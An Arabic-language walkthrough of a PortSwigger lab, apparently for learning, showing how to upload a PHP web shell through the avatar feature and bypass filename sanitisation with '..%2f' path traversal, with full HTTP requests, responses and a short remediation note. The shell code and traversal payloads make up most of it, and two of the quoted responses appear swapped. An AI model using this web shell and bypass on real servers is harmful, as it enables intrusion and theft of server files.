# [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

## **`الهدف`**
قم برفع ملف `PHP Web Shell` بسيط واستخدمه لاستخراج محتويات ملف `/home/carlos/secret` ثم قم بتقديمه كـ `Solutiom`.
## **`خطوات الحل`**
سنقوم بتسجيل الدخول إلى حساب `wiener:peter` بعد ذلك سنقوم بعمل ملف نصي على الجهاز باستخدام أى برنامج تحرير نصوص ونضع بداخله الكود التالي ونقوم بحفظه بصيغة `php` وأى اسم عشوائي مثل `TESTTEST`:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
بعد ذلك سنقوم برفعه باستخدام خاصية رفع الـ `Avatar` داخل اللاب
وبمجرد اتمام الرفع وعمل تجديد لصفحة `My account` سنجد في الـ `HTTP history` الطلب التالي والذي يستدعي الملف تلقائيًا:
```http
HTTP/2 200 OK
Date: Mon, 28 Sep 2026 20:02:52 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Mon, 28 Sep 2026 20:02:41 GMT
Etag: "37-65c908c6e276c"
Accept-Ranges: bytes
X-Frame-Options: SAMEORIGIN
Content-Length: 55

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

وبفحص الاستجابة سنجد أنه لا يوجد بداخلها الـ `Secret`، ولكن بدلًا من ذلك يوجد بداخلها نفس الأمر الذي قمنا بحقن في ملف الـ `PHP`
```http
HTTP/2 200 OK
Date: Sun, 27 Sep 2026 17:35:39 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

IMT2Af2hcukhHxTGEkbqs3PQ5q1Zw8J6
```

لذلك سنحاول استغلال الـ `Path Traversal` فسنقوم بتعديل قيمة جزئية `filename` في الملف الأصلي من `TESTTEST.php` إلى `filename=../TESTTEST.php`
```http
POST /my-account/avatar HTTP/2
Host: 0abb0006044727c78024e4ed00580064.web-security-academy.net
Cookie: session=OEEaThNz3SJJKkO2sWPLrbFDJzkhvZAm
Content-Length: 480
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryavElCxd4QBhW8Q8H
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: https://0abb0006044727c78024e4ed00580064.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0abb0006044727c78024e4ed00580064.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundaryavElCxd4QBhW8Q8H
Content-Disposition: form-data; name="avatar"; filename="../TESTTEST.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryavElCxd4QBhW8Q8H
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryavElCxd4QBhW8Q8H
Content-Disposition: form-data; name="csrf"

zWGZhssCawHb39tlV9uTa1rLFjEj7Wj0
------WebKitFormBoundaryavElCxd4QBhW8Q8H--
```
ولكن بفحص الاستجابة:
```http
HTTP/2 200 OK
Date: Mon, 28 Sep 2026 20:01:52 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 133

The file avatars/TESTTEST.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

سنلاحظ أنه يتم تعقيم المدخلات وحذف الـ `/` لذلك سنجرب إضافتها مرة أخرى ولكن بعد عمل `URL Encoding` لها لتصبح 
`filename="..%2fTESTTEST.php`
```http
POST /my-account/avatar HTTP/2
Host: 0abb0006044727c78024e4ed00580064.web-security-academy.net
Cookie: session=OEEaThNz3SJJKkO2sWPLrbFDJzkhvZAm
Content-Length: 482
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypBoCNWEikqc9MiBs
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: https://0abb0006044727c78024e4ed00580064.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0abb0006044727c78024e4ed00580064.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundarypBoCNWEikqc9MiBs
Content-Disposition: form-data; name="avatar"; filename="..%2fTESTTEST.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundarypBoCNWEikqc9MiBs
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundarypBoCNWEikqc9MiBs
Content-Disposition: form-data; name="csrf"

zWGZhssCawHb39tlV9uTa1rLFjEj7Wj0
------WebKitFormBoundarypBoCNWEikqc9MiBs--
```
وسنجد أن الاستجابة كانت ناجحة هذه المرة وتم حفظ الصورة في مكان أخر
```http
HTTP/2 200 OK
Date: Mon, 28 Sep 2026 19:59:37 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 136

The file avatars/../TESTTEST.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

وبعد ذلك سنعود إلى اللاب ونقوم بعمل تجديد لصفحة `My account` سنجد في الـ `HTTP history` الطلب التالي والذي يستدعي الملف تلقائيًا:
```http
GET /files/avatars/..%2fTESTTEST.php HTTP/2
Host: 0abb0006044727c78024e4ed00580064.web-security-academy.net
Cookie: session=OEEaThNz3SJJKkO2sWPLrbFDJzkhvZAm
```
ولكن استجابته ستكون بها خطأ ما:
```http
HTTP/2 404 Not Found
Date: Mon, 28 Sep 2026 19:59:40 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1
X-Frame-Options: SAMEORIGIN
Content-Length: 274

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 6ee63aef6707 Port 80</address>
</body></html>
```

لذلك كل ماعلينا فعله هو تحويلها إلى `Repeater` وتغيير المسار من `GET /files/avatars/..%2fTESTTEST.php` إلى `GET /files/avatars/../TESTTEST.php`
```http
GET /files/avatars/../TESTTEST.php HTTP/2
Host: 0abb0006044727c78024e4ed00580064.web-security-academy.net
Cookie: session=OEEaThNz3SJJKkO2sWPLrbFDJzkhvZAm
```
وبفحص الاستجابة سنجد بداخلها الـ `Secret` المطلوب
```http
HTTP/2 200 OK
Date: Mon, 28 Sep 2026 19:59:51 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

pWb3fCq4LkuC2VVKUcBUWSzPEoEHo6Sh
```
بعد ذلك سنقوم بنسخه ثم نعود للصفحة الرئيسية للاب ونضغط على  `Submit solution` ونضعه في الحقل ونضغط `OK` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Remote code execution via web shell upload](./Remote-code-execution-via-web-shell-upload.md)
ويجب عدم الاعتماد على `filename` لتحديد مسار الملف وبدلًا من ذلك يتم تحديد مجلد ثابت في النظام يتم حفظ الصور فيه.
